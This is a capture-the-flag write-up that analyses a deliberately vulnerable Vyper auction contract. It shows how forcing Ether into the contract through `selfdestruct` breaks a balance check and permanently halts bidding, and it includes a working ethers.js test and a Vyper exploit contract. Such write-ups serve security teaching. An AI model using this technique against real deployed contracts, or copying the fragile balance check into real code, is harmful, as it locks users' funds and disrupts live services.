## 1) Challenge

> <cite>The Unstoppable Auction is a simple Ether auction contract. It is supposedly permissionless and unstoppable. Your objective is to halt the auction.</cite>

Challenge created by [@jtriley_eth](https://twitter.com/jtriley_eth).


## 2) Code Review

`UnstoppableAuction.vy` contract ([source code](https://github.com/JoshuaTrujillo15/offensive_vyper/blob/main/contracts/unstoppable-auction/UnstoppableAuction.vy)):

```python

# @version ^0.3.2

"""
@title Unstoppable Auction
@author jtriley.eth
@license MIT
"""

event NewBid:
    bidder: indexed(address)
    amount: uint256


owner: public(address)

total_deposit: public(uint256)

deposits: public(HashMap[address, uint256])

highest_bid: public(uint256)

highest_bidder: public(address)

auction_start: public(uint256)

auction_end: public(uint256)


@external
def __init__(auction_start: uint256, auction_end: uint256):
    assert auction_start < auction_end, "invalid time stamps"

    self.auction_start = auction_start

    self.auction_end = auction_end

    self.owner = msg.sender


@internal
def _handle_bid(bidder: address, amount: uint256):
    assert self.balance == self.total_deposit + amount, "invalid balance"

    assert self.auction_start <= block.timestamp and block.timestamp < self.auction_end, "not active"

    # if the current bidder is not highest_bidder, assert their bid is higher than the last,
    # otherwise, this means the highest_bidder is increasing their bid
    if bidder != self.highest_bidder:
        assert amount > self.highest_bid, "bid too low"

    self.total_deposit += amount

    self.deposits[bidder] += amount

    self.highest_bid = amount

    self.highest_bidder = bidder

    log NewBid(bidder, amount)


@external
def withdraw():
    """
    @notice Withdraws a losing bid
    @dev Throws if msg sender is still the highest bidder
    """
    assert self.highest_bidder != msg.sender, "highest bidder may not withdraw"

    assert self.balance == self.total_deposit, "invalid balance"

    amount: uint256 = self.deposits[msg.sender]

    self.deposits[msg.sender] = 0

    self.total_deposit -= amount

    send(msg.sender, amount)


@external
def owner_withdraw():
    """
    @notice Owner withdraws Ether once the auction ends
    @dev Throws if msg sender is not the owner or if the auction has not ended
    """
    assert msg.sender == self.owner, "unauthorized"

    assert self.balance == self.total_deposit, "invalid balance"

    assert block.timestamp >= self.auction_end, "auction not ended"

    send(msg.sender, self.balance)


@external
@payable
def bid():
    """
    @notice Places a bid if msg.value is greater than previous bid. If bidder is the
    same as the last, allow them to increase their bid.
    @dev Throws if bid is not high enough OR if auction is not live.
    """
    self._handle_bid(msg.sender, msg.value)


@external
@payable
def __default__():
    self._handle_bid(msg.sender, msg.value)


```

Contract main functions:

- `_handle_bid` holds the logic for handling the bid. `bid` and the `__default__` functions call it. In particular, multiple conditions need to be satisfied to set a new bid:
    - the contract balance is equal to the `total_deposit` variable plus the amount of the bid (line `42`)
    - the auction is still valid (i.e. if it's started and not ended) - line `44.`
    - the bidder is not the highest (line `48`); if it's true, it checks if the current bid is greater than the highest bid (line `49`). If the bidder is not the highest and the bid is not greater than the highest bid, the function fails with an assert message.
    - it increments the value of the `total_deposit` variable (line `51`)
    - it increments the bid of the bidder (line `53`)
    - it sets the highest bid with the value of the current bid amount (line `55`)
    - it sets the highest bidder with the current bidder (line `57`)

- `withdraw` is used to withdraw the bid if it's not the highest:
    - the caller is not the highest bidder (line `68`)
    - the contract balance equals the `total_deposit` value
    - lines `72-78`, update the `deposits` variable and sends the value deposited to the sender

- `owner_withdraw` is used by the owner to withdraw the balance when the auction is ended
- `bid` calls `_handle_bid`
- `__default__`, the fallback function, calls `_handle_bid`

Since our goal is to stop the auction from working, let's focus our attention on the `_handle_bid` function.

#### How can we stop the contract from handling bids?

If we can make one of the conditions inside the `_handle_bid` function permanently false, it will no longer complete its execution, causing a Denial-of-Service.

Among the conditions in `_handle_bid`, only the condition at line `42` relies on comparing balance values that are stored in different places:
- `self.balance` is the contract balance
- `total_deposit` is a variable that is updated when someone sends a new highest bid 

When calling `withdraw`, both `self.balance` and `total_deposit` are updated with the same value:
- `self.balance` is decreased because the `send` function is called (it transfers the balance of the contract to `msg.sender`)
- `total_deposit` is reduced by the same amount that is sent to the `msg.sender`

We need to find a way to update `self.balance` but not `total_deposit`. This way, the condition `assert self.balance == self.total_deposit + amount, "invalid balance"` will always be false.

#### How can we send ETH to the contract?

We can transfer ETH to the contract by calling `raw_call` (with some value amount) from a contract or using `sendTransaction` from a `ethers` script. However, the problem with this approach is that the fallback function defined in the contract will call the `_handle_bid`.

#### Is there a way to transfer ETH without triggering any fallback function?

The answer is **YES**. It's possible to send the balance of a contract to another one by calling `selfdestruct`. This way, no code is executed on the receiver contract, and thus the `__default__` fallback will not be called. However, the balance of the contract that calls `selfdestruct` will be transferred to the target contract. It means if we call `selfdestruct` from a contract we control (that has some balance) and we set the receiver to be the auction contract, we will update the auction balance but not the `total_deposit` variable, making the condition at line `42` false.


## 3) Solution

The solution consists of two steps:
- send some ETH to our contract so that its balance will be `> 0` 
- execute the `run` function of our contract that will call `selfdestruct` specifying the receiver as the auction contract

`unstoppable-auction.challenge.js`:
```javascript

    it('Exploit', async function () {
        // YOUR EXPLOIT HERE

        let exploit = await (
            await ethers.getContractFactory('UnstoppableAuctionExploit', deployer)
        ).deploy(this.auction.address)


        let tx = {
            to: exploit.address,
            value: ethers.utils.parseEther("0.001"),
            gasLimit: 50000
        }

        await attacker.sendTransaction(tx)


        await exploit.connect(attacker).run();

    })

```


`UnstoppableAuctionExploit.vy`:
```python

# YOUR EXPLOIT HERE
@external
def run():
    selfdestruct(self.target)


@external
@payable
def __default__():
    pass

```

You can find the complete code [here](https://github.com/dellalibera/offensive_vyper-solutions/blob/main/test/unstoppable-auction.challenge.js) and [here](https://github.com/dellalibera/offensive_vyper-solutions/blob/main/contracts/exploits/UnstoppableAuctionExploit.vy).


## 4) References

- [vyper - raw_call](https://vyper.readthedocs.io/en/v0.3.6/built-in-functions.html#raw_call) 
- [vyper - selfdestruct](https://vyper.readthedocs.io/en/v0.3.6/built-in-functions.html#selfdestruct)
- [ethers - sendTransaction](https://docs.ethers.io/v5/api/signer/#Signer-sendTransaction)
- [SWC-132 - Unexpected Ether balance](https://swcregistry.io/docs/SWC-132)
- [Force Feeding - selfdestruct](https://consensys.github.io/smart-contract-best-practices/attacks/force-feeding/#selfdestruct)